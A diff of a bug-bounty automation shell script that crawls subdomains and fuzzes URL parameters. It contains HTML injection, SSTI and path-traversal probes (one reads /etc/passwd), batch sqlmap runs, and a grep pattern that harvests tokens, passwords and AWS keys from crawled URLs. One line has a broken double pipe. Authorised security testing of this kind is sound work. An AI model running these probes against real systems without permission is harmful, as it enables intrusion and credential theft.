@@ -49,7 +49,6 @@ with open("bug_bounty_domains.txt", "w") as f:
 EOF
 
 echo "Extraction complete! Check 'bug_bounty_domains.txt'"
-mkdir -p /opt/
 
 echo "==================================="
 echo "💀 Salaar Bug Bounty Automation 💀"
@@ -77,6 +76,7 @@ grep ".js" /opt/katana-urls.txt > /opt/katana-js-files.txt
 grep -Ei "token=|key=|apikey=|access_token=|secret=|auth=|password=|session=|jwt=|bearer=|Authorization=|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY" /opt/katana-urls.txt > /opt/katana-secrets.txt
 grep -Ei "wp-content|wp-login|wp-admin|wp-includes|wp-json|xmlrpc.php|wordpress|wp-config|wp-cron.php" /opt/katana-urls.txt > /opt/katana-wordpress.txt
 rm /opt/katana-urls.txt
+
 
 cat subdomains.txt | urlfinder >> /opt/urlfinder-urls.txt
 cat /opt/urlfinder-urls.txt | grep = | qsreplace salaar >> /opt/urlfinder-params.txt
@@ -124,7 +124,7 @@ cat js-files.txt | mantra > js-mantra-results.txt
 
 # Parameter Fuzzing
 echo "[+] Fuzzing for XSS..."
-cat params.txt | qsreplace '<u>hyper</u>' | while read -r host; do
+cat params.txt | grep -Eiv '\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)($|[?&])' | shuf | qsreplace '<u>hyper</u>' | while read -r host; do
     curl --silent --path-as-is -L --insecure "$host" | grep -qs "<u>hyper" && echo "$host"
 done | tee htmli.txt
 
@@ -150,11 +150,6 @@ cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity critical -
 cat nuclei-*.txt | sort -u > nuclei-results.txt
 rm nuclei-*.txt
 
-
-# SQLMAP
-mkdir sqlmap-results
-cat params.txt | grep -Ei 'select|report|role|update|query|user|name|sort|where|search|params|process|row|view|table|from|sel|results|sleep|fetch|order|keyword|column|field|delete|string|number|filter' | python3 /opt/sqlmap/sqlmap.py --batch --banner  --output-dir=sqlmap-results/
-
 echo "[+] Fuzzing for SSTI..."
 cat params.txt | | grep -E "template=|preview=|id=|view=|activity=|name=|content=|redirect=" \
 | shuf | qsreplace 'salaar{{7*7}}' | while read -r host; do
@@ -166,4 +161,10 @@ cat params.txt | grep -E "file=|document=|folder=|root=|path=|pg=|style=|pdf=|te
 | shuf | qsreplace '../../../../../../etc/passwd' | while read -r host; do
     curl --silent --path-as-is -L --insecure "$host" | grep -qs "root:x" && echo "$host"
 done | tee lfi.txt
+
+# SQLMAP
+mkdir sqlmap-results
+cat params.txt | grep -Ei 'select|report|role|update|query|user|name|sort|where|search|params|process|row|view|table|from|sel|results|sleep|fetch|order|keyword|column|field|delete|string|number|filter' | python3 /opt/sqlmap/sqlmap.py --batch --banner  --output-dir=sqlmap-results/
+
+
 echo "✅ Script execution completed!"
